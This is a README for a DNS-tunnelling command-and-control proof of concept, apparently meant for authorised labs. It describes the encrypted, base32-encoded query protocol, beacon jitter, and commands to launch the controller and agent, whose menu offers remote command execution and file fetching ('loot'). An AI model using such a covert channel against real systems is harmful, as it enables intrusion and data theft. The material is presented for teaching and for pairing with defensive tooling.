# aether-dns

DNS tunnelling C2 for authorised labs and coursework.

A controller and an agent talk over DNS queries. Upstream data is compressed
with zlib, encrypted with AES-256-GCM, then carried as base32 labels
(`str-` / `chk-` / `end-`). The controller asks for missing frames with
selective-repeat `R###` answers. Commands go the other way as a short
`PULL`/`IDLE` A answer, then a full `LS|…` / `RUN|…` / `SEND|…` string in a
TXT record — so you are not stuck stuffing a whole shell command into four
bytes of A RDATA.

This is a teaching PoC, not a product. Pair it with the blue-side tools in
plaintext-suite if you want both halves of the story.

## Features (honest list)

- AES-256-GCM with a random IV per stream payload
- zlib before encrypt
- base32 in DNS labels, dots in filenames mapped to `__` on the wire
- selective-repeat retry for a missing chunk
- beacon jitter (~±30% around a 4s base)
- interactive menu on its own thread path (DNS recv is not blocked by input)
- `systemd-resolved` stopped for port 53, restored on exit / atexit

## Dependencies

`pycryptodome` is required (AES-GCM). Earlier README drafts claimed “zero
deps”; that was wrong for crypto. Install it:

```bash
pip3 install pycryptodome
# or from the suite root:
pip3 install -r requirements.txt
```

## Crypto key

There is **no silent default key**. Pick one:

```bash
# 32 random bytes as 64 hex chars
export AETHER_KEY="$(openssl rand -hex 32)"

# or pass it:
sudo python3 aether_server.py --key-hex "$AETHER_KEY" ...
python3 aether_agent.py -s 192.0.2.10 --key-hex "$AETHER_KEY"
```

For a quick classroom demo only:

```bash
sudo python3 aether_server.py --demo-key
python3 aether_agent.py -s 192.0.2.10 --demo-key
```

`--demo-key` uses a fixed teaching key and prints a loud warning. Do not use
it outside a lab.

## Usage

Controller (needs root for :53 and to manage systemd-resolved):

```bash
sudo python3 aether_server.py --demo-key
# options: --bind 0.0.0.0 --port 53 --domain aether.internal
```

Agent:

```bash
python3 aether_agent.py -s <CONTROLLER_IP> --demo-key
# options: -d / --domain, --port
```

Menu after the agent beacons:

```text
=== Aether DNS lab menu ===
1: List Directory | 2: Run Command | 3: Fetch File | 4: Exit & Restore
```

Wait one beacon cycle (a few seconds with jitter) after you queue a job.
Console output prints on the controller; fetched files land as `loot_*`.

## Lab notes

- Port 53 is noisy on the public internet; for AWS or classroom networks you
  can raise `--port` on both sides (e.g. 5353) if your lab allows it.
- Only point the agent at **your** controller.
- Authorised labs and coursework only — see the suite [DISCLAIMER.md](../../DISCLAIMER.md).

## Limitations

- One missing chunk retried per `end-` round-trip
- TXT commands capped ~200 bytes
- Fake zone name (`aether.internal` by default); no real DNS delegation required for IP-direct queries
- Hard kill of the controller can leave `systemd-resolved` stopped until you start it again
